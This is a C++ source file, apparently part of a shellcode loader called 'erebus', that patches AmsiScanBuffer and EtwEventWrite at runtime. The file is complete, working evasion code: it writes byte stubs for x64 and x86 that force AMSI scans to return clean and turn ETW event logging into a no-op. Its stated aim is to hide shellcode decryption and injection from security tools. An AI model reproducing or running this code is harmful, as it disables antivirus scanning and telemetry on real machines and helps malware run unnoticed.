/**
 * @file evasion.cpp
 * @brief AMSI and ETW runtime patching
 *
 * Patches AmsiScanBuffer and EtwEventWrite at runtime to suppress
 * security telemetry before shellcode decryption and injection.
 *
 * Technique:
 *   - Load the target DLL (amsi.dll / ntdll.dll)
 *   - Resolve the target function via GetProcAddress
 *   - Flip the first bytes to PAGE_EXECUTE_READWRITE
 *   - Overwrite with a stub that returns a clean/benign value
 *   - Restore original page protection
 *
 * The AMSI patch writes:
 *   mov eax, 0x80070057   ; E_INVALIDARG - forces AMSI_RESULT_CLEAN
 *   ret
 *
 * The ETW patch writes:
 *   xor eax, eax          ; STATUS_SUCCESS
 *   ret
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion.hpp"

namespace erebus {
namespace evasion {

    // ----------------------------------------------------------------
    // AMSI bypass - patch AmsiScanBuffer
    // ----------------------------------------------------------------

    BOOL PatchAmsi()
    {
        // amsi.dll is delay-loaded; force it into the process
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi)
        {
            // amsi.dll not present (e.g. server core, older Windows) - nothing to patch
            LOG_INFO("amsi.dll not loaded, skipping AMSI patch");
            return TRUE;
        }

        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer)
        {
            LOG_ERROR("Failed to resolve AmsiScanBuffer");
            return FALSE;
        }

        // x64 patch: mov eax, 0x80070057; ret  (6 bytes)
        // x86 patch: mov eax, 0x80070057; ret 0x18  (8 bytes)
#ifdef _WIN64
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC3                            // ret
        };
#else
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC2, 0x18, 0x00               // ret 0x18
        };
#endif

        DWORD oldProtect = 0;
        if (!VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("VirtualProtect failed on AmsiScanBuffer");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));

        // Restore original protection
        VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

        LOG_SUCCESS("AMSI patched (AmsiScanBuffer -> E_INVALIDARG)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // ETW bypass - patch EtwEventWrite
    // ----------------------------------------------------------------

    BOOL PatchEtw()
    {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll)
        {
            LOG_ERROR("Failed to get ntdll.dll for ETW patch");
            return FALSE;
        }

        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite)
        {
            LOG_ERROR("Failed to resolve EtwEventWrite");
            return FALSE;
        }

        // xor eax, eax; ret  (3 bytes) - returns STATUS_SUCCESS
        BYTE patch[] = {
            0x33, 0xC0,  // xor eax, eax
            0xC3         // ret
        };

        DWORD oldProtect = 0;
        if (!VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("VirtualProtect failed on EtwEventWrite");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)pEtwEventWrite, patch, sizeof(patch));

        VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

        LOG_SUCCESS("ETW patched (EtwEventWrite -> nop)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // Combined entry point
    // ----------------------------------------------------------------

    BOOL RunEvasionPatches()
    {
        BOOL amsi_ok = PatchAmsi();
        BOOL etw_ok  = PatchEtw();

        // Partial success is acceptable - AMSI may not be loaded in
        // non-.NET host processes.
        return amsi_ok || etw_ok;
    }

} // namespace evasion
} // namespace erebus
